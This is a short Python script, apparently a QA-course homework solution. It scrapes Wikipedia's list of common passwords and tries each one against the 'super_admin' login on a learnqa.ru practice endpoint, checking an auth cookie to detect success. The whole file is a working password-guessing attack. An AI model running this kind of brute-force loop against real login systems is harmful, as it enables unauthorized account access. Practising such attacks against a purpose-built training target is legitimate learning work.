import requests
from bs4 import BeautifulSoup

wikipage = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords").text
page_data = BeautifulSoup(wikipage, "lxml")
passwords = []
rows = page_data.select("#mw-content-text > div.mw-parser-output > table:nth-child(10) > tbody > tr")
for row in rows:
    columns = row.select('td')
    try:
        passwords.append(columns[-1].text.strip())
    except IndexError:
        continue

for password in passwords:
    data = {
        "login": "super_admin",
        "password": f"{password}"
    }
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=data)
    cookies = response.cookies
    response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response.text == "You are authorized":
        print(f"You are authorized, ваш пароль: {password}")
        break
